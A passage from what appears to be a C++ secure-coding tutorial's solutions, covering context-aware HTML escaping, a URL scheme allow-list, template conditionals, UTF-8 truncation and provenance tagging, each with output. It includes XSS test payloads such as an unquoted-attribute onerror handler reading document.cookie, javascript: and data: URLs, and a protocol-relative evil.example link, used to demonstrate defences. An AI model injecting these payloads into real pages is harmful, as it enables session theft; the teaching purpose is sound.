}

int main() {
    // A payload with no HTML metacharacter at all. It does not need one, if the
    // attribute is not quoted.
    const std::string value = "x onerror=alert(document.cookie)";

    std::printf("--- text context ---\n");
    std::printf("  <p>%s</p>\n", escape_html(value).c_str());

    std::printf("--- quoted attribute, escaped ---\n");
    std::printf("  <img src=\"%s\">\n", escape_html(value).c_str());

    std::printf("--- unquoted attribute, escaped ---\n");
    std::printf("  <img src=%s>\n", escape_html(value).c_str());
    std::printf("  -> escaping changed nothing here: a space still ends the attribute\n");

    std::printf("--- unquoted attribute, payload WITH a quote ---\n");
    const std::string quoted = "x\" onerror=\"alert(1)";
    std::printf("  <img src=%s>\n", escape_html(quoted).c_str());
    std::printf("  -> &quot; is inert inside an unquoted attribute value, and the\n");
    std::printf("     space still splits it: escaping is not a substitute for quotes\n");

    std::printf("--- the value that proves the escaper is context-blind ---\n");
    std::printf("  escaped == original ? %s\n",
                escape_html(value) == value ? "yes (no metacharacters)" : "no");
    return 0;
}
```

```text
--- text context ---
  <p>x onerror=alert(document.cookie)</p>
--- quoted attribute, escaped ---
  <img src="x onerror=alert(document.cookie)">
--- unquoted attribute, escaped ---
  <img src=x onerror=alert(document.cookie)>
  -> escaping changed nothing here: a space still ends the attribute
--- unquoted attribute, payload WITH a quote ---
  <img src=x&quot; onerror=&quot;alert(1)>
  -> &quot; is inert inside an unquoted attribute value, and the
     space still splits it: escaping is not a substitute for quotes
--- the value that proves the escaper is context-blind ---
  escaped == original ? yes (no metacharacters)
```
:::

:::solution Exercise 2
`data:` is the interesting one: it is a legitimate scheme for images and a complete HTML
document execution context for links. One allow-list, checked against the parsed scheme, and
everything that is not on it becomes the fallback:

```cpp run
#include <cstdio>
#include <string>
#include <string_view>

std::string escape_html(std::string_view input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

static std::string lower(std::string_view s) {
    std::string out(s);
    for (char &c : out) {
        if (c >= 'A' && c <= 'Z') c = static_cast<char>(c - 'A' + 'a');
    }
    return out;
}

// The scheme is everything before the FIRST colon. Searching the whole string
// for "data:" would reject a perfectly ordinary URL that merely mentions it.
std::string safe_url(std::string_view raw, std::string_view fallback) {
    const std::size_t colon = raw.find(':');
    if (colon != std::string_view::npos) {
        bool scheme_shaped = true;
        for (std::size_t i = 0; i < colon; ++i) {
            const char c = raw[i];
            const bool ok = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                            (c >= '0' && c <= '9') || c == '+' || c == '-' || c == '.';
            if (!ok) scheme_shaped = false;
        }
        if (scheme_shaped) {
            const std::string scheme = lower(raw.substr(0, colon));
            if (scheme == "http" || scheme == "https" || scheme == "mailto") {
                return escape_html(raw);
            }
            return std::string(fallback);  // data:, vbscript:, javascript:, ...
        }
    }
    if (raw.size() > 1 && raw.front() == '/' && raw[1] == '/') {
        return std::string(fallback);  // protocol-relative means "another host"
    }
    if (!raw.empty() && raw.front() == '#') {
        return std::string(fallback);  // a fragment is not a destination
    }
    return escape_html(raw);  // no scheme: a relative path
}

static void check(std::string_view url) {
    std::printf("  %-46s -> %s\n", std::string(url).c_str(), safe_url(url, "/").c_str());
}

int main() {
    std::printf("rejected:\n");
    check("data:text/html;base64,PHNjcmlwdD4=");
    check("vbscript:msgbox(1)");
    check("javascript:alert(1)");
    check("JaVaScRiPt:alert(1)");
    check("//evil.example");
    check("#section");

    std::printf("accepted:\n");
    check("https://example.com/page?ref=data:text/html");
    check("mailto:ada@example.com");
    check("/profile/ada");
    check("about/team");
    return 0;
}
```

```text
rejected:
  data:text/html;base64,PHNjcmlwdD4=             -> /
  vbscript:msgbox(1)                             -> /
  javascript:alert(1)                            -> /
  JaVaScRiPt:alert(1)                            -> /
  //evil.example                                 -> /
  #section                                       -> /
accepted:
  https://example.com/page?ref=data:text/html    -> https://example.com/page?ref=data:text/html
  mailto:ada@example.com                         -> mailto:ada@example.com
  /profile/ada                                   -> /profile/ada
  about/team                                     -> about/team
```

Note that the check is on the **scheme**, not on a substring of the whole URL — a deny-list that
searches for `data:` anywhere would also reject
`https://example.com/page?ref=data:text/html`, which is a perfectly ordinary link.
:::

:::solution Exercise 3
A conditional is a block with a start marker and an end marker, so the scanner needs a stack —
or, as here, recursion over the segment. Keeping the "unknown placeholder throws" rule is what
makes the conditional safe to add: a typo inside the block is still an error rather than a
silently-rendered empty string.

```cpp run
#include <cstdio>
#include <map>
#include <stdexcept>
#include <string>

std::string escape_html(const std::string &input) {
    std::string out;
    out.reserve(input.size());
    for (const char c : input) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return out;
}

// `{{#if name}} ... {{/if}}` renders the body only when `name` was supplied.
// Recursion over the body is what keeps placeholders inside a conditional
// subject to the same rules as the ones outside it.
std::string render(const std::string &tpl, const std::map<std::string, std::string> &vars) {
    std::string out;
    std::size_t i = 0;
    while (i < tpl.size()) {
        const std::size_t open = tpl.find("{{", i);
        if (open == std::string::npos) {
            out += tpl.substr(i);
            break;
        }
        out += tpl.substr(i, open - i);

        if (tpl.compare(open, 6, "{{#if ") == 0) {
            const std::size_t name_end = tpl.find("}}", open);
            if (name_end == std::string::npos) throw std::runtime_error("unterminated {{#if");
            const std::string name = tpl.substr(open + 6, name_end - open - 6);
            const std::size_t close = tpl.find("{{/if}}", name_end);
            if (close == std::string::npos) {
                throw std::runtime_error("{{#if " + name + "}} has no {{/if}}");
            }
            if (vars.count(name) != 0) {
                out += render(tpl.substr(name_end + 2, close - name_end - 2), vars);
            }
            i = close + 7;
            continue;
        }

        const bool raw = tpl.compare(open, 3, "{{{") == 0;
        const std::size_t name_at = open + (raw ? 3 : 2);
        const std::size_t close = tpl.find(raw ? "}}}" : "}}", name_at);
        if (close == std::string::npos) {
            throw std::runtime_error("unterminated placeholder at offset " + std::to_string(open));
        }
        const std::string name = tpl.substr(name_at, close - name_at);
        const auto found = vars.find(name);
        if (found == vars.end()) {
            throw std::runtime_error("no value supplied for {{" + name + "}}");
        }
        out += raw ? found->second : escape_html(found->second);
        i = close + (raw ? 3 : 2);
    }
    return out;
}

int main() {
    const std::string tpl =
        "<h1>{{title}}</h1>\n"
        "{{#if subtitle}}<p class=\"sub\">{{subtitle}}</p>{{/if}}\n"
        "<p>{{body}}</p>\n";

    std::printf("--- with a subtitle ---\n");
    std::printf("%s", render(tpl, {{"title", "Post"},
                                   {"subtitle", "a <b>subtitle</b>"},
                                   {"body", "text"}})
                          .c_str());

    std::printf("--- without one ---\n");
    std::printf("%s", render(tpl, {{"title", "Post"}, {"body", "text"}}).c_str());

    std::printf("--- the rules still apply inside the block ---\n");
    try {
        render("{{#if title}}{{missing}}{{/if}}", {{"title", "Post"}});
    } catch (const std::runtime_error &e) {
        std::printf("  caught: %s\n", e.what());
    }
    try {
        render("{{#if title}}no end", {{"title", "Post"}});
    } catch (const std::runtime_error &e) {
        std::printf("  caught: %s\n", e.what());
    }
    return 0;
}
```

```text
--- with a subtitle ---
<h1>Post</h1>
<p class="sub">a &lt;b&gt;subtitle&lt;/b&gt;</p>
<p>text</p>
--- without one ---
<h1>Post</h1>

<p>text</p>
--- the rules still apply inside the block ---
  caught: no value supplied for {{missing}}
  caught: {{#if title}} has no {{/if}}
```
:::

:::solution Exercise 4
Two constraints, applied in order: cut at a character boundary first, then walk back to the last
space inside what remains. The order matters — cutting to a word boundary and *then* fixing
UTF-8 would leave you back at an arbitrary byte.

```cpp run
#include <cstddef>
#include <cstdio>
#include <string>

static bool is_continuation(unsigned char byte) { return (byte & 0xC0) == 0x80; }

static bool valid_utf8(const std::string &s) {
    std::size_t i = 0;
    while (i < s.size()) {
        const unsigned char lead = static_cast<unsigned char>(s[i]);
        std::size_t extra = 0;
        if (lead < 0x80) extra = 0;
        else if ((lead & 0xE0) == 0xC0) extra = 1;
        else if ((lead & 0xF0) == 0xE0) extra = 2;
        else if ((lead & 0xF8) == 0xF0) extra = 3;
        else return false;
        if (i + extra >= s.size()) return false;
        for (std::size_t k = 1; k <= extra; ++k) {
            if (!is_continuation(static_cast<unsigned char>(s[i + k]))) return false;
        }
        i += extra + 1;
    }
    return true;
}

static std::string truncate_utf8(const std::string &s, std::size_t limit) {
    if (s.size() <= limit) return s;
    std::size_t end = limit;
    if (is_continuation(static_cast<unsigned char>(s[end]))) {
        while (end > 0 && is_continuation(static_cast<unsigned char>(s[end]))) --end;
    }
    return s.substr(0, end);
}

// Order matters: cut to a character boundary FIRST, then walk back to a word
// boundary inside what is already valid text. Doing it the other way round puts
// you back at an arbitrary byte.
std::string truncate_words(const std::string &s, std::size_t limit) {
    std::string cut = truncate_utf8(s, limit);
    if (cut.size() < s.size()) {
        const std::size_t space = cut.find_last_of(' ');
        if (space != std::string::npos && space > 0) cut.erase(space);
    }
    return cut;
}

int main() {
    // Spaces between the multi-byte words, so that cutting at different offsets
    // lands in different places and the word boundary actually moves.
    const std::string text = "the quick brown fox 你好 世界 再见 朋友 jumps over";
    std::printf("full: %zu bytes\n", text.size());

    for (std::size_t limit = 21; limit <= 42; limit += 3) {
        const std::string naive = text.substr(0, limit);
        const std::string safe = truncate_words(text, limit);
        std::printf("limit %2zu  naive valid=%-3s | safe valid=%-3s  \"%s\"\n", limit,
                    valid_utf8(naive) ? "yes" : "NO", valid_utf8(safe) ? "yes" : "NO",
                    safe.c_str());
    }
    return 0;
}
```

```text
full: 58 bytes
limit 21  naive valid=NO  | safe valid=yes  "the quick brown fox"
limit 24  naive valid=NO  | safe valid=yes  "the quick brown fox"
limit 27  naive valid=yes | safe valid=yes  "the quick brown fox 你好"
limit 30  naive valid=yes | safe valid=yes  "the quick brown fox 你好"
limit 33  naive valid=yes | safe valid=yes  "the quick brown fox 你好"
limit 36  naive valid=NO  | safe valid=yes  "the quick brown fox 你好 世界"
limit 39  naive valid=NO  | safe valid=yes  "the quick brown fox 你好 世界"
limit 42  naive valid=NO  | safe valid=yes  "the quick brown fox 你好 世界 再见"
```
:::

:::solution Exercise 5
Provenance is metadata about trust, and putting it in the output turns a code-review question
into something you can read off the page. The enum makes "written by us" and "produced by a
sanitiser" different values, which is the distinction the markdown scenario above depends on.

```cpp run
#include <cstdio>
#include <map>
#include <string>
#include <string_view>

// Three different claims get three different names. "escaped" and "sanitised"
// are not the same trust level, and collapsing them is how a sanitiser's output
// ends up reviewed as if it were markup the team wrote.
enum class Provenance { escaped, sanitised, authored };

const char *name(Provenance p) {
    switch (p) {
        case Provenance::escaped:  return "escaped";
        case Provenance::sanitised: return "sanitised";
        case Provenance::authored: return "authored";
    }
    return "unknown";
}

class Html {
public:
    Html(std::string text, Provenance origin) : text_(std::move(text)), origin_(origin) {}
    std::string_view text() const { return text_; }
    Provenance provenance() const { return origin_; }

private:
    std::string text_;
    Provenance origin_;
};

Html escape(const std::string &raw) {
    std::string out;
    for (const char c : raw) {
        switch (c) {
            case '&':  out += "&amp;";  break;
            case '<':  out += "&lt;";   break;
            case '>':  out += "&gt;";   break;
            case '"':  out += "&quot;"; break;
            case '\'': out += "&#39;";  break;
            default:   out += c;        break;
        }
    }
    return Html(std::move(out), Provenance::escaped);
}

// Stand-ins for a sanitiser and for markup in the source tree.
Html sanitised(std::string markup) { return Html(std::move(markup), Provenance::sanitised); }
Html authored(std::string markup) { return Html(std::move(markup), Provenance::authored); }

std::string render(const std::string &tpl, const std::map<std::string, Html> &vars) {
    std::string out;
    std::size_t i = 0;
    while (i < tpl.size()) {
        const std::size_t open = tpl.find("{{", i);
        if (open == std::string::npos) {
            out += tpl.substr(i);
            break;
        }
        out += tpl.substr(i, open - i);
        const std::size_t close = tpl.find("}}", open + 2);
        const std::string key = tpl.substr(open + 2, close - open - 2);
        const Html &value = vars.at(key);
        out += value.text();
        // The provenance travels with the value, so a reviewer reading the
        // generated page can see where each hole was filled from.
        out += "<!-- " + key + ": " + name(value.provenance()) + " -->";
        i = close + 2;
    }
    return out;
}

int main() {
    std::printf("%s", render("<h1>{{title}}</h1>\n<p>{{body}}</p>\n<footer>{{note}}</footer>\n",
                             {{"title", escape("<script>alert(1)</script>")},
                              {"body", sanitised("<em>from markdown</em>")},
                              {"note", authored("<small>we wrote this</small>")}})
                          .c_str());
    return 0;
}
```

```text
<h1>&lt;script&gt;alert(1)&lt;/script&gt;<!-- title: escaped --></h1>
<p><em>from markdown</em><!-- body: sanitised --></p>
<footer><small>we wrote this</small><!-- note: authored --></footer>
```
:::
